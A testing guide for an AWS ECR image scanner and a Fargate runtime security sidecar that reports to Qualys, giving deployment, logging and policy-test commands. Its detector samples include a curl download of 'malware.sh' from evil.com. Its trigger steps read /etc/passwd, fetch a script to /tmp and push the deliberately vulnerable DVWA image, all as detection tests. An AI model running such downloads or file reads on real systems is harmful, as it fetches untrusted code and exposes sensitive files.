# Testing Guide

This guide covers how to test both the ECR Image Scanner and Runtime Security Sidecar components.

## Prerequisites

- AWS Account with necessary permissions
- AWS CLI configured
- Docker installed
- Python 3.11+ installed
- Qualys subscription with Container Security
- Qualys POD and access token

## Testing the ECR Image Scanner

### 1. Unit Testing the Lambda Function

Test the Lambda function locally without deploying:

```bash
cd image-scanner-lambda

# Install dependencies
pip install -r requirements.txt

# Create a test event
cat > test_event.json <<EOF
{
  "detail": {
    "eventName": "PutImage",
    "requestParameters": {
      "repositoryName": "test-app"
    },
    "responseElements": {
      "image": {
        "imageId": {
          "imageDigest": "sha256:abc123",
          "imageTag": "latest"
        }
      }
    }
  }
}
EOF

# Test the handler
python3 -c "
import json
import lambda_function

with open('test_event.json') as f:
    event = json.load(f)

result = lambda_function.lambda_handler(event, {})
print(json.dumps(result, indent=2))
"
```

### 2. Deploy and Test Image Scanner

```bash
# Set environment variables
export QUALYS_POD=US2
export QUALYS_TOKEN=your-qualys-token
export AWS_REGION=us-east-1

# Deploy the stack
make deploy-image-scanner

# Verify deployment
aws cloudformation describe-stacks \
  --stack-name qualys-fargate-scanner \
  --query 'Stacks[0].StackStatus'

# List outputs
aws cloudformation describe-stacks \
  --stack-name qualys-fargate-scanner \
  --query 'Stacks[0].Outputs'
```

### 3. Trigger a Scan by Pushing an Image

```bash
# Create a test ECR repository
aws ecr create-repository --repository-name test-app

# Build and push a test image
docker pull nginx:latest
docker tag nginx:latest ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:latest

# Login to ECR
aws ecr get-login-password --region ${AWS_REGION} | \
  docker login --username AWS --password-stdin ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com

# Push image (this triggers the scanner)
docker push ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:latest
```

### 4. Verify Scan Results

```bash
# Check Lambda logs
aws logs tail /aws/lambda/qualys-fargate-scanner-image-scanner \
  --follow \
  --region ${AWS_REGION}

# Check DynamoDB cache
aws dynamodb scan \
  --table-name qualys-fargate-scanner-scan-cache \
  --limit 5

# Check S3 for results
aws s3 ls s3://qualys-fargate-scanner-scan-results-${AWS_ACCOUNT_ID}/scan-results/ \
  --recursive

# Download and view a result
aws s3 cp s3://qualys-fargate-scanner-scan-results-${AWS_ACCOUNT_ID}/scan-results/test-app/sha256:abc123/20250122-120000.json - | jq .
```

### 5. Test SNS Alerts

```bash
# Subscribe your email to the SNS topic
SNS_TOPIC_ARN=$(aws cloudformation describe-stacks \
  --stack-name qualys-fargate-scanner \
  --query 'Stacks[0].Outputs[?OutputKey==`AlertTopicArn`].OutputValue' \
  --output text)

aws sns subscribe \
  --topic-arn ${SNS_TOPIC_ARN} \
  --protocol email \
  --notification-endpoint your-email@example.com

# Confirm the subscription in your email

# Push an image with known vulnerabilities (triggers alert)
docker pull vulnerables/web-dvwa:latest
docker tag vulnerables/web-dvwa:latest ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:vulnerable
docker push ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:vulnerable
```

## Testing the Runtime Security Sidecar

### 1. Build the Sidecar Image

```bash
# Build locally
make build-runtime-sidecar

# Test the image locally
docker run --rm -it \
  --cap-add SYS_PTRACE \
  -e MONITORING_MODE=minimal \
  fargate-runtime-sidecar:latest \
  python3 -c "
import policy_engine
import qualys_crs_client
import software_detector

print('Testing policy engine...')
engine = policy_engine.PolicyEngine('policies/tracing-policy-schema.yaml')
print(f'Loaded {len(engine.file_rules)} file rules')
print(f'Loaded {len(engine.process_rules)} process rules')

print('\nTesting software detector...')
detector = software_detector.SoftwareDetector()
result = detector.detect_installation('/usr/bin/apt', 'install nginx')
print(f'Detected: {result}')

print('\nAll components working correctly')
"
```

### 2. Unit Test Policy Engine

```bash
cd runtime-sidecar

# Test policy loading and matching
python3 policy_engine.py

# Expected output:
# Policy loaded: runtime-security-policy
#   File rules: 7
#   Process rules: 19
#   Package manager rules: 5
#   Traced syscalls: 21
#
# Testing FIM rules:
#   /etc/passwd write: critical - alert
#
# Testing process rules:
#   apt install: medium - alert
#
# Testing package manager detection:
#   apt-get install: medium
#
# Testing network rules:
#   10.0.1.50:443 allowed: True
```

### 3. Unit Test Software Detector

```bash
python3 software_detector.py

# Expected output:
# Software Installation Detection Tests:
#
# [INSTALL] /usr/bin/apt install nginx curl
#   Package Manager: apt
#   Operation: install
#   Packages: nginx, curl
#
# [INSTALL] /usr/bin/pip3 install requests boto3
#   Package Manager: pip3
#   Operation: install
#   Packages: requests, boto3
#
# [DOWNLOAD] /usr/bin/curl -o malware.sh https://evil.com/malware.sh
#   Download Tool: curl
#   File: malware.sh
```

### 4. Test Qualys CRS Client

```bash
# Set environment variables
export QUALYS_POD=US2
export QUALYS_ACCESS_TOKEN=your-token
export ECS_TASK_ARN=arn:aws:ecs:us-east-1:123456789012:task/test-cluster/abc123

# Test sending events
python3 qualys_crs_client.py

# Expected output:
# Qualys CRS Client initialized: POD=US2, Gateway=https://gateway.qg2.apps.qualys.com
# Sent 4 events to Qualys CRS
# Test events sent successfully
```

### 5. Deploy Sidecar to ECR

```bash
# Push to ECR
make push-runtime-sidecar

# Verify image was pushed
aws ecr describe-images \
  --repository-name fargate-runtime-sidecar \
  --query 'imageDetails[*].[imageTags[0],imagePushedAt]' \
  --output table
```

### 6. Deploy Test Application with Sidecar

Create a test ECS task definition:

```bash
# Get your AWS account ID and region
export AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export AWS_REGION=us-east-1

# Create a test task definition
cat > test-task.json <<EOF
{
  "family": "test-app-with-security",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "512",
  "memory": "1024",
  "executionRoleArn": "arn:aws:iam::${AWS_ACCOUNT_ID}:role/ecsTaskExecutionRole",
  "taskRoleArn": "arn:aws:iam::${AWS_ACCOUNT_ID}:role/ecsTaskRole",
  "platformVersion": "1.4.0",
  "containerDefinitions": [
    {
      "name": "nginx",
      "image": "nginx:latest",
      "essential": true,
      "portMappings": [
        {
          "containerPort": 80,
          "protocol": "tcp"
        }
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/test-app",
          "awslogs-region": "${AWS_REGION}",
          "awslogs-stream-prefix": "nginx"
        }
      }
    },
    {
      "name": "runtime-security",
      "image": "${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/fargate-runtime-sidecar:latest",
      "essential": false,
      "environment": [
        {
          "name": "MONITORING_MODE",
          "value": "balanced"
        },
        {
          "name": "ALERT_THRESHOLD",
          "value": "75"
        },
        {
          "name": "LOG_GROUP_NAME",
          "value": "/ecs/fargate-runtime-security"
        },
        {
          "name": "QUALYS_POD",
          "value": "US2"
        },
        {
          "name": "QUALYS_ACCESS_TOKEN",
          "value": "${QUALYS_TOKEN}"
        }
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/fargate-runtime-security",
          "awslogs-region": "${AWS_REGION}",
          "awslogs-stream-prefix": "sidecar"
        }
      },
      "linuxParameters": {
        "capabilities": {
          "add": ["SYS_PTRACE"],
          "drop": ["ALL"]
        }
      },
      "dependsOn": [
        {
          "containerName": "nginx",
          "condition": "START"
        }
      ]
    }
  ]
}
EOF

# Register task definition
aws ecs register-task-definition --cli-input-json file://test-task.json

# Create CloudWatch log groups
aws logs create-log-group --log-group-name /ecs/test-app 2>/dev/null || true
aws logs create-log-group --log-group-name /ecs/fargate-runtime-security 2>/dev/null || true
```

### 7. Run the Task

```bash
# Run the task in your VPC
aws ecs run-task \
  --cluster your-cluster-name \
  --task-definition test-app-with-security \
  --launch-type FARGATE \
  --platform-version 1.4.0 \
  --network-configuration "awsvpcConfiguration={
    subnets=[subnet-xxx],
    securityGroups=[sg-xxx],
    assignPublicIp=ENABLED
  }"

# Get the task ARN from the output
export TASK_ARN=<task-arn-from-output>
```

### 8. Monitor Runtime Security Events

```bash
# Watch sidecar logs in real-time
aws logs tail /ecs/fargate-runtime-security --follow

# You should see:
# Fargate Runtime Security Monitor v2 starting...
# Policy loaded successfully
# Qualys CRS client initialized
# Waiting for application container to start...
# Found application process: PID 123, Command: nginx
# Monitoring PID 123
# Starting policy-based monitoring of PID 123
# Tracing syscalls: execve,open,openat,connect,...
```

### 9. Trigger Security Events

Connect to the task and trigger security events:

```bash
# Get task public IP
TASK_IP=$(aws ecs describe-tasks \
  --cluster your-cluster-name \
  --tasks ${TASK_ARN} \
  --query 'tasks[0].containers[?name==`nginx`].networkInterfaces[0].privateIpv4Address' \
  --output text)

# Execute commands in the nginx container to trigger events
aws ecs execute-command \
  --cluster your-cluster-name \
  --task ${TASK_ARN} \
  --container nginx \
  --interactive \
  --command "/bin/bash"

# Inside the container, run test commands:

# Test 1: File access monitoring
touch /etc/test-file
cat /etc/passwd

# Test 2: Software installation (if apt available)
apt-get update
apt-get install -y curl

# Test 3: Network connection
curl https://example.com

# Test 4: Suspicious activity (triggers high severity alert)
curl -o /tmp/test.sh https://example.com/test.sh
```

### 10. Verify Security Events

```bash
# Check CloudWatch Logs for detected events
aws logs tail /ecs/fargate-runtime-security --follow --filter-pattern "process_execution"

# Check for file access events
aws logs tail /ecs/fargate-runtime-security --follow --filter-pattern "file_access"

# Check for network events
aws logs tail /ecs/fargate-runtime-security --follow --filter-pattern "network_connection"

# Check for software installation events
aws logs tail /ecs/fargate-runtime-security --follow --filter-pattern "software_installation"

# Check CloudWatch Metrics
aws cloudwatch get-metric-statistics \
  --namespace FargateRuntimeSecurity \
  --metric-name ProcessExecution \
  --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 \
  --statistics Sum
```

### 11. Test Custom Policies

```bash
# Create a custom policy
cat > custom-policy.yaml <<EOF
apiVersion: security.qualys.com/v1
kind: TracingPolicy
metadata:
  name: custom-test-policy

spec:
  fileIntegrityMonitoring:
    enabled: true
    paths:
      - path: /tmp
        recursive: true
        events: [write]
        severity: low
        action: log

  processExecution:
    enabled: true
    trackedExecutables:
      - name: curl
        severity: medium
        action: alert

  syscallFiltering:
    tracedSyscalls:
      - execve
      - open
      - connect

  performance:
    samplingRate: 1.0
EOF

# Test policy locally
python3 -c "
from policy_engine import PolicyEngine

engine = PolicyEngine('custom-policy.yaml')
print(f'File rules: {len(engine.file_rules)}')
print(f'Process rules: {len(engine.process_rules)}')

# Test file matching
rule = engine.should_monitor_file('/tmp/test.txt', 'write')
print(f'Should monitor /tmp/test.txt: {rule is not None}')

# Test process matching
rule = engine.should_monitor_process('/usr/bin/curl', 'https://example.com')
print(f'Should monitor curl: {rule is not None}')
"
```

## Integration Testing

### Full End-to-End Test

```bash
# 1. Deploy image scanner
make deploy-image-scanner

# 2. Deploy runtime sidecar
make push-runtime-sidecar

# 3. Push a vulnerable image
docker pull vulnerables/web-dvwa:latest
docker tag vulnerables/web-dvwa:latest ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:dvwa
docker push ${AWS_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com/test-app:dvwa

# 4. Wait for scan to complete (check Lambda logs)
aws logs tail /aws/lambda/qualys-fargate-scanner-image-scanner --follow

# 5. Deploy the scanned image with runtime sidecar
# (Update task definition with the new image URI)

# 6. Monitor runtime security
aws logs tail /ecs/fargate-runtime-security --follow

# 7. Verify events in Qualys CRS
# (Login to Qualys portal and check Container Runtime Security events)
```

## Performance Testing

### Measure Sidecar Overhead

```bash
# Deploy task without sidecar
aws ecs run-task \
  --cluster your-cluster \
  --task-definition nginx-baseline \
  --launch-type FARGATE

# Record baseline CPU/Memory metrics
aws cloudwatch get-metric-statistics \
  --namespace AWS/ECS \
  --metric-name CPUUtilization \
  --dimensions Name=ServiceName,Value=nginx-baseline \
  --start-time $(date -u -d '30 minutes ago' +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 \
  --statistics Average

# Deploy task with sidecar
aws ecs run-task \
  --cluster your-cluster \
  --task-definition test-app-with-security \
  --launch-type FARGATE

# Compare CPU metrics
# Expected overhead: 5-15% depending on monitoring mode
```

## Troubleshooting

### Sidecar Not Starting

```bash
# Check task definition has correct platform version
aws ecs describe-task-definition \
  --task-definition test-app-with-security \
  --query 'taskDefinition.platformVersion'

# Should be "1.4.0" or later

# Check SYS_PTRACE capability is granted
aws ecs describe-task-definition \
  --task-definition test-app-with-security \
  --query 'taskDefinition.containerDefinitions[?name==`runtime-security`].linuxParameters.capabilities'

# Should show: {"add": ["SYS_PTRACE"], "drop": ["ALL"]}
```

### No Events Being Logged

```bash
# Check if policy loaded correctly
aws logs filter-log-events \
  --log-group-name /ecs/fargate-runtime-security \
  --filter-pattern "Policy loaded"

# Check if application PID was found
aws logs filter-log-events \
  --log-group-name /ecs/fargate-runtime-security \
  --filter-pattern "Found application process"

# Check for errors
aws logs filter-log-events \
  --log-group-name /ecs/fargate-runtime-security \
  --filter-pattern "ERROR"
```

### Events Not Reaching Qualys

```bash
# Check Qualys credentials
aws logs filter-log-events \
  --log-group-name /ecs/fargate-runtime-security \
  --filter-pattern "Qualys CRS client initialized"

# Check for API errors
aws logs filter-log-events \
  --log-group-name /ecs/fargate-runtime-security \
  --filter-pattern "Error sending events to Qualys"

# Test network connectivity to Qualys
aws ecs execute-command \
  --cluster your-cluster \
  --task ${TASK_ARN} \
  --container runtime-security \
  --interactive \
  --command "curl -v https://gateway.qg2.apps.qualys.com"
```

## Cleanup

```bash
# Stop running tasks
aws ecs stop-task --cluster your-cluster --task ${TASK_ARN}

# Delete CloudFormation stack
aws cloudformation delete-stack --stack-name qualys-fargate-scanner

# Delete ECR repositories
aws ecr delete-repository --repository-name fargate-runtime-sidecar --force
aws ecr delete-repository --repository-name test-app --force

# Delete log groups
aws logs delete-log-group --log-group-name /ecs/test-app
aws logs delete-log-group --log-group-name /ecs/fargate-runtime-security
aws logs delete-log-group --log-group-name /aws/lambda/qualys-fargate-scanner-image-scanner
```

## Continuous Testing

### Automated Testing Script

```bash
#!/bin/bash
# test-runner.sh

set -e

echo "Running automated tests..."

# Test 1: Policy engine
echo "Test 1: Policy Engine"
cd runtime-sidecar
python3 policy_engine.py || exit 1

# Test 2: Software detector
echo "Test 2: Software Detector"
python3 software_detector.py || exit 1

# Test 3: Build Docker image
echo "Test 3: Docker Build"
docker build -t test-sidecar -f Dockerfile . || exit 1

# Test 4: Validate CloudFormation
echo "Test 4: CloudFormation Validation"
aws cloudformation validate-template \
  --template-body file://../cloudformation/image-scanner.yaml || exit 1

echo "All tests passed"
```

Make it executable and run:
```bash
chmod +x test-runner.sh
./test-runner.sh
```
